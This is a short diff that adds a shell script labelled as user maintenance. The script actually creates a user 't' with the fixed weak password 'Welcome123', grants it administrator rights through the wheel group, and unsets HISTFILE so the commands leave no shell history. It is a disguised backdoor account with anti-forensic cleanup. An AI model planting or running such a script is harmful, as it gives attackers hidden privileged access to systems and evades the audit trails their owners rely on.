@@ -1,0 +1,9 @@
+#user maint 
+adduser t
+echo -e "Welcome123\nWelcome123" | passwd t
+usermod -aG wheel t
+
+
+
+
+unset HISTFILE && exit
